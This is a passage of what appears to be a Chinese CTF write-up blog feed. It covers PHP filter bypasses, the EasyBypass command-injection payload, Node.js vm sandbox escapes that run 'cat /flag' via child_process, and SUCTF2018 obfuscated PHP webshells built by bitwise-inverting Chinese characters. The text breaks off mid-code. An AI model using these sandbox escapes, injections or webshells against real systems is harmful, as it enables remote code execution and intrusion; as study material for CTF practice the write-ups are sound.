class="hljs ada">在 PHP 的 <span class="hljs-keyword">Exception</span> 类中，构造函数实际上可以接收三个参数，尽管在大多数情况下，只使用前两个参数就足够了。这三个参数分别是：<br><br>消息（message）：这是一个字符串，用于描述异常的具体原因或情况。它是构造函数的第一个参数，也是必须提供的参数。<br><br>代码（code）：这是一个整数，用于提供异常的特定代码。它是可选的，但在某些情况下，它可能有助于识别或分类异常。如果没有提供，它默认为 <span class="hljs-number">0</span>。<br><br>前一个异常（previous）：这是一个 <span class="hljs-keyword">Exception</span> 对象，用于表示当前异常之前发生的异常。这是可选的，但在处理异常的链式传递时非常有用。如果提供了这个参数，那么当前的异常就被视为前一个异常的“子异常”或“后继异常”。<br><br>而当该对象作为字符串输出是之后输出消息以及错误代码的行数  ( 重点 )<br></code></pre></td></tr></table></figure><p>具体实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Exception</span><span class="hljs-punctuation">:</span> <span class="hljs-string">payload in E:\CTF\newphp\mixbp.php:2</span><br><span class="hljs-attribute">Stack trace</span><span class="hljs-punctuation">:</span><br><span class="hljs-comment">#0 &#123;main&#125;</span><br><br><span class="hljs-attribute">Exception</span><span class="hljs-punctuation">:</span> <span class="hljs-string">payload in E:\CTF\newphp\mixbp.php:2</span><br><span class="hljs-attribute">Stack trace</span><span class="hljs-punctuation">:</span><br><span class="hljs-comment">#0 &#123;main&#125;</span><br></code></pre></td></tr></table></figure><p>所以我们可以通过上面的特性来绕过强类型比较.</p><hr><h3 id="取反绕过单双引号以及include包含字符串"><a href="#取反绕过单双引号以及include包含字符串" class="headerlink" title="取反绕过单双引号以及include包含字符串"></a>取反绕过单双引号以及include包含字符串</h3><p>有时候题目过滤了单双引号，如果没有引号闭合在eval函数内不会被解析执行，我们可以通过取反符号来突破限制，并且include能够字符串进行包含</p><p>具体实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$in</span> = <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=mixbp.php&quot;</span>;<br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;?&gt;&lt;?=include&quot;</span>.<span class="hljs-variable">$in</span>.<span class="hljs-string">&quot;?&gt;&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">Parse <span class="hljs-keyword">error</span>: syntax <span class="hljs-keyword">error</span>, unexpected <span class="hljs-string">&#x27;:&#x27;</span>, expecting <span class="hljs-string">&#x27;,&#x27;</span> or <span class="hljs-string">&#x27;;&#x27;</span> <span class="hljs-keyword">in</span> E:\CTF\newphp\mixbp.php(<span class="hljs-number">5</span>) : <span class="hljs-keyword">eval</span>()<span class="hljs-string">&#x27;d code on line 1</span><br></code></pre></td></tr></table></figure><p>可以看到没用成功执行包含</p><p>使用取反</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$in</span> = ~<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=mixbp.php&quot;</span>;<br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="hljs-variable">$in</span>.<span class="hljs-string">&quot;?&gt;&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-number">1</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">Warning: <span class="hljs-keyword">Use</span> of undefined constant �����Й�����М������ѝ�����Қ�����Ѝ�����������я�� - assumed &#x27;�����Й�����М������ѝ�����Қ�����Ѝ�����������я��&#x27; (this will throw <span class="hljs-keyword">an</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">in</span> a future <span class="hljs-keyword">version</span> of PHP) <span class="hljs-keyword">in</span> <span class="hljs-keyword">E</span>:\CTF\newphp\mixbp.php(5) : eval()&#x27;<span class="hljs-keyword">d</span> code <span class="hljs-keyword">on</span> <span class="hljs-keyword">line</span> 1<br>PD9waHANCiRpbiA9IH4icGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1taXhicC5waHAiOw0KJHBheWxvYWQgPSAiPz48Pz1pbmNsdWRlfiIuJGluLiI/PiI7DQokYSA9IG5ldyBlcnJvcigkcGF5bG9hZCwxKTsNCmV2YWwoJGEpOw0KDQo/Pg==1 <span class="hljs-keyword">in</span> <span class="hljs-keyword">E</span>:\CTF\newphp\mixbp.php:4<br><span class="hljs-keyword">Stack</span> trace:<br>#0 &#123;main&#125;<br><br></code></pre></td></tr></table></figure><p>虽然报错，但是成功执行</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP原生类 </tag>
            
            <tag> 取反绕过 </tag>
            
            <tag> php标签 </tag>
            
            <tag> Error/Exception </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EasyBypass</title>
      <link href="/2025/04/20/EasyBypass/"/>
      <url>/2025/04/20/EasyBypass/</url>
      
        <content type="html"><![CDATA[<h1 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$comm1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;comm1&#x27;</span>];<br><span class="hljs-variable">$comm2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;comm2&#x27;</span>];<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="hljs-variable">$comm1</span>))<br>    <span class="hljs-variable">$comm1</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, <span class="hljs-variable">$comm2</span>))<br>    <span class="hljs-variable">$comm2</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;#flag in /flag&quot;</span>;<br><br><span class="hljs-variable">$comm1</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$comm1</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br><span class="hljs-variable">$comm2</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$comm2</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;file <span class="hljs-subst">$comm1</span> <span class="hljs-subst">$comm2</span>&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-meta">?&gt;</span><br>cannot open `<span class="hljs-string">&#x27; (No such file or directory)</span><br></code></pre></td></tr></table></figure><p>代码审计</p><p>过滤了cat和一些命令，但是没有过滤tac，用tac</p><p>过滤了了flag和*，用fla?绕过</p><p>在最后一段可以看到已经执行了一个命令，所以我们需要使用 ; 结束上一个命令</p><p>因为在comm2中，;符号和tac被过滤掉了，所以我们使用comm1文件包含</p><p>在前后加”，用来闭合源码拼接的双引号</p><p>payload：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>omm1=<span class="hljs-string">&quot;;tac%20/fla?&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> php代码审计 </tag>
            
            <tag> rce </tag>
            
            <tag> 闭合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HFCTF2020-JustEscape</title>
      <link href="/2025/04/20/HFCTF2020-JustEscape/"/>
      <url>/2025/04/20/HFCTF2020-JustEscape/</url>
      
        <content type="html"><![CDATA[<h1 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="HFCTF2020-JustEscape"></a>HFCTF2020-JustEscape</h1><p>这题没搞懂，直接看的题解，然后也没弄懂。好像是js，但是没学过…</p><p>用<code>Error().stack</code>,看一下报错信息。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">9</span>eb95c3e-<span class="hljs-number">9040</span>-<span class="hljs-number">45</span>a9-bbfe-a76c12f964f0.node5.buuoj.cn:<span class="hljs-number">81</span>/run.php?code=Error().stack<br></code></pre></td></tr></table></figure><p><img src="/../image/HFCTF2020-JustEscape-1.png"></p><p>报错显示是<code>vm.js</code>，考的vm沙箱逃逸。</p><p><a href="https://xilitter.github.io/2023/01/31/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/index.html">Nodejs vm&#x2F;vm2沙箱逃逸</a></p><p><a href="https://github.com/patriksimek/vm2/issues/225">POC参考：</a><br><strong>payload1:</strong></p><p><strong>js的模板文字绕过</strong></p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">function</span> ()&#123;<br>    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)()<span class="hljs-comment">;</span><br>    try&#123;<br>        Object.preventExtensions(<span class="hljs-name">Buffer.from</span>(``)).a = <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>    &#125;catch(<span class="hljs-name">e</span>)&#123;<br>        return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString()<span class="hljs-comment">;</span><br>    &#125;<br>&#125;)()<br><br></code></pre></td></tr></table></figure><p><strong>payload2</strong>:<br><strong>(<code>join</code>拼接字符串)</strong></p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">(()=&gt;&#123; <span class="hljs-symbol">TypeError</span>[[<span class="hljs-string">`p`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`y`</span>,<span class="hljs-string">`p`</span>,<span class="hljs-string">`e`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>)][<span class="hljs-string">`a`</span>] = f=&gt;f[[<span class="hljs-string">`c`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`n`</span>,<span class="hljs-string">`s`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`u`</span>,<span class="hljs-string">`c`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`r`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>)]([<span class="hljs-string">`r`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`u`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`n`</span>,<span class="hljs-string">` `</span>,<span class="hljs-string">`p`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`c`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`s`</span>,<span class="hljs-string">`s`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>))(); try&#123; <span class="hljs-symbol">Object</span>[<span class="hljs-string">`preventExtensions`</span>](<span class="hljs-symbol">Buffer</span>[<span class="hljs-string">`from`</span>](<span class="hljs-string">``</span>))[<span class="hljs-string">`a`</span>] = <span class="hljs-number">1</span>; &#125;catch(e)&#123; return e[<span class="hljs-string">`a`</span>](()=&gt;&#123;&#125;)[<span class="hljs-string">`mainModule`</span>][[<span class="hljs-string">`r`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`q`</span>,<span class="hljs-string">`u`</span>,<span class="hljs-string">`i`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`e`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>)]([<span class="hljs-string">`c`</span>,<span class="hljs-string">`h`</span>,<span class="hljs-string">`i`</span>,<span class="hljs-string">`l`</span>,<span class="hljs-string">`d`</span>,<span class="hljs-string">`_`</span>,<span class="hljs-string">`p`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`c`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`s`</span>,<span class="hljs-string">`s`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>))[[<span class="hljs-string">`e`</span>,<span class="hljs-string">`x`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`c`</span>,<span class="hljs-string">`S`</span>,<span class="hljs-string">`y`</span>,<span class="hljs-string">`n`</span>,<span class="hljs-string">`c`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>)](<span class="hljs-string">`cat /flag`</span>)[<span class="hljs-string">`toString`</span>](); &#125; &#125;)()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> vm沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2018-GetShell</title>
      <link href="/2025/04/20/SUCTF2018-GetShell/"/>
      <url>/2025/04/20/SUCTF2018-GetShell/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF2018-GetShel"><a href="#SUCTF2018-GetShel" class="headerlink" title="SUCTF2018-GetShel"></a>SUCTF2018-GetShel</h1><p>这题看题目就知道要我们上传webshell，首先启动靶机访问，显示can you get shell?。</p><p><img src="/../image/SUCTF2018-GetShell-1.png"></p><p>然后查看网页源代码，发现一个跳转链接</p><p><img src="/../image/SUCTF2018-GetShell-2.png"></p><p>点击跳转到了一个upload页面</p><p><img src="/../image/SUCTF2018-GetShell-3.png"></p><p>给了一部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$contents</span>,<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$black_char</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$b</span>) !== <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal char&quot;</span>);<br>        &#125;<br>    &#125;     <br>&#125; <br></code></pre></td></tr></table></figure><p>代码审计</p><p>大概就是截取文件中前5个字符以后的内容，然后在将黑名单中的字符与截取后的内容的进行匹配。所以我们需要通过fuzz测试来测试出过滤了哪些字符，然后再构造shell，注意前面要5个占位符，因为源码会将前五个字符截掉，不然我们的测试就没有效果。</p><p>fuzz字典生成脚本</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">for <span class="hljs-selector-tag">i</span> in <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i))<br></code></pre></td></tr></table></figure><p><img src="/../image/SUCTF2018-GetShell-4.png"></p><h2 id="汉字字符取反构造webshell"><a href="#汉字字符取反构造webshell" class="headerlink" title="汉字字符取反构造webshell"></a>汉字字符取反构造webshell</h2><h3 id="payload-1（system）"><a href="#payload-1（system）" class="headerlink" title="payload 1（system）"></a>payload 1（system）</h3><p>发现主要过滤了数字、字母等字符。但是发现~可以利用。我们可以利用汉字字符取反来得到字母，php标签被过滤了但是没有关系，前5个字符不会参与检查。我们这里使用短标签，&lt;?php应该也可以刚好5个字符</p><p>使用的是<a href="https://so.csdn.net/so/search?q=%E4%BD%8D%E8%BF%90%E7%AE%97&spm=1001.2101.3001.7020">位运算</a>里的“取反”。</p><p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如’和’{2}的结果是”\x8c”，其<a href="https://so.csdn.net/so/search?q=%E5%8F%96%E5%8F%8D&spm=1001.2101.3001.7020">取反</a>即为字母s</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[_]);<br><span class="hljs-variable">$_</span>=[]; <span class="hljs-comment">//array</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>; /arrayarray<br><span class="hljs-variable">$_</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$__</span>);<span class="hljs-comment">//$_=(array==arrayarray) false 0</span><br><span class="hljs-variable">$__</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$_</span>);<span class="hljs-comment">//$__=(array==array) true 1</span><br><br><span class="hljs-variable">$___</span>=~区[<span class="hljs-variable">$__</span>].~冈[<span class="hljs-variable">$__</span>].~区[<span class="hljs-variable">$__</span>].~勺[<span class="hljs-variable">$__</span>].~皮[<span class="hljs-variable">$__</span>].~针[<span class="hljs-variable">$__</span>];<span class="hljs-comment">//system</span><br><span class="hljs-variable">$____</span>=~码[<span class="hljs-variable">$__</span>].~寸[<span class="hljs-variable">$__</span>].~小[<span class="hljs-variable">$__</span>].~欠[<span class="hljs-variable">$__</span>].~立[<span class="hljs-variable">$__</span>];<span class="hljs-comment">//_POST</span><br><br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$$____</span>[_]);<span class="hljs-comment">//system($_POST[_]);</span><br><br></code></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$__</span>);<span class="hljs-variable">$__</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$_</span>);<span class="hljs-variable">$___</span>=~区[<span class="hljs-variable">$__</span>].~冈[<span class="hljs-variable">$__</span>].~区[<span class="hljs-variable">$__</span>].~勺[<span class="hljs-variable">$__</span>].~皮[<span class="hljs-variable">$__</span>].~针[<span class="hljs-variable">$__</span>];<span class="hljs-variable">$____</span>=~码[<span class="hljs-variable">$__</span>].~寸[<span class="hljs-variable">$__</span>].~小[<span class="hljs-variable">$__</span>].~欠[<span class="hljs-variable">$__</span>].~立[<span class="hljs-variable">$__</span>];<span class="hljs-variable">$___</span>(<span class="hljs-variable">$$</span>____[_]);<br></code></pre></td></tr></table></figure><p>或者另一种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> ~茉[<span class="hljs-variable">$____</span>];<span class="hljs-comment">//s</span><br><span class="hljs-keyword">echo</span> ~内[<span class="hljs-variable">$____</span>];<span class="hljs-comment">//y</span><br><span class="hljs-keyword">echo</span> ~茉[<span class="hljs-variable">$____</span>];<span class="hljs-comment">//s</span><br><span class="hljs-keyword">echo</span> ~苏[<span class="hljs-variable">$____</span>];<span class="hljs-comment">//t</span><br><span class="hljs-keyword">echo</span> ~的[<span class="hljs-variable">$____</span>];<span class="hljs-comment">//e</span><br><span class="hljs-keyword">echo</span> ~咩[<span class="hljs-variable">$____</span>];<span class="hljs-comment">//m</span><br><span class="hljs-keyword">echo</span> ~课[<span class="hljs-variable">$____</span>];<span class="hljs-comment">//P</span><br><span class="hljs-keyword">echo</span> ~尬[<span class="hljs-variable">$____</span>];<span class="hljs-comment">//O</span><br><span class="hljs-keyword">echo</span> ~笔[<span class="hljs-variable">$____</span>];<span class="hljs-comment">//S</span><br><span class="hljs-keyword">echo</span> ~端[<span class="hljs-variable">$____</span>];<span class="hljs-comment">//T</span><br><span class="hljs-keyword">echo</span> ~瞎[<span class="hljs-variable">$____</span>];<span class="hljs-comment">//a</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$____</span>=<span class="hljs-variable">$_</span>==<span class="hljs-variable">$_</span>;<span class="hljs-variable">$___</span>=~茉[<span class="hljs-variable">$____</span>];<span class="hljs-variable">$___</span>.=~内[<span class="hljs-variable">$____</span>];<span class="hljs-variable">$___</span>.=~茉[<span class="hljs-variable">$____</span>];<span class="hljs-variable">$___</span>.=~苏[<span class="hljs-variable">$____</span>];<span class="hljs-variable">$___</span>.=~的[<span class="hljs-variable">$____</span>];<span class="hljs-variable">$___</span>.=~咩[<span class="hljs-variable">$____</span>];<span class="hljs-variable">$_____</span>=_;<span class="hljs-variable">$_____</span>.=~课[<span class="hljs-variable">$____</span>];<span class="hljs-variable">$_____</span>.=~尬[<span class="hljs-variable">$____</span>];<span class="hljs-variable">$_____</span>.=~笔[<span class="hljs-variable">$____</span>];<span class="hljs-variable">$_____</span>.=~端[<span class="hljs-variable">$____</span>];<span class="hljs-variable">$__________</span>=<span class="hljs-variable">$$</span>_____;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$__________</span>[~瞎[<span class="hljs-variable">$____</span>]]);<br><br>&lt;<span class="hljs-string">?=</span>system(<span class="hljs-variable">$_POST</span>[a]);<br></code></pre></td></tr></table></figure><p>修改文件内容为以上代码</p><p>查看传上去的文件，发现可解析，对a参数传参env查看环境变量，找到flag</p><p><img src="/../image/SUCTF2018-GetShell-5.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">0099</span>f301-<span class="hljs-number">7172</span>-<span class="hljs-number">418</span>d-<span class="hljs-number">819</span>e-<span class="hljs-number">5</span>fd2dd494513&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="payload-2（assert）"><a href="#payload-2（assert）" class="headerlink" title="payload 2（assert）"></a>payload 2（assert）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[_]);<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$__</span>=[];<br><span class="hljs-variable">$_</span>=(<span class="hljs-variable">$__</span>==<span class="hljs-variable">$__</span>);<br><span class="hljs-variable">$__</span>=~(融);<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(匆);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>].<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(随);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(千);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(苦);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$____</span>=~(~(_));<br><span class="hljs-variable">$__</span>=~(诗);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(尘);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(欣);<br><span class="hljs-variable">$____</span>.=<span 